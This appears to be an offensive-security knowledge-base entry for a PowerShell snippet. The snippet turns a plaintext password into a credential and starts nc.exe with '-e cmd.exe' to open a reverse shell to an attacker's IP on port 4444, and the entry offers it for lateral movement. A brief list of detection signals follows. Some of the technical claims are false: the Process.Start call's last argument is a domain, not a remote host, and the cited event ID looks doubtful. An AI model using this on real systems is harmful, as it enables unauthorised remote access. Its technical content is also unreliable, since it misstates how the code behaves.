---
id: f89ee0da-e940-46f5-8186-e7a21303c273
name: powershell-start-nc-with-remote-creds
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:29.950116+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - remote-execution
  - reverse-shell
  - powershell
validated: true
---

# powershell-start-nc-with-remote-creds

## Code

```powershell
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```

## Description

This PowerShell script creates secure credentials from plaintext input and uses `System.Diagnostics.Process.Start` to remotely execute `nc.exe` on a target host as the specified user, opening a reverse shell to the attacker.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <password> | Plaintext password for remote user | SecurePass |
| <user> | Remote admin username | DOMAIN\Admin |
| <hostname> | Target hostname or IP | targethost |
| <attacker_ip> | Attacker's listening IP | 192.168.1.100 |

## Usage

Execute in a PowerShell session with network access to the target. Assumes `nc.exe` is present on the remote host. Creates a reverse shell without interactive prompts, suitable for automation in lateral movement after obtaining remote creds.

## Detection

- PowerShell ScriptBlock logging (Module 4104) capturing credential creation and process start.
- Remote process creation via WMI or RPC (Event ID 514) with `nc.exe` args.
- Outbound network from target to attacker IP on non-standard ports.
- AMSI scans for `ConvertTo-SecureString` and `PSCredential` patterns.

## Related

- [[procedures/windows-privilege-escalation-via-runas]]
- [[tools/Netcat]]
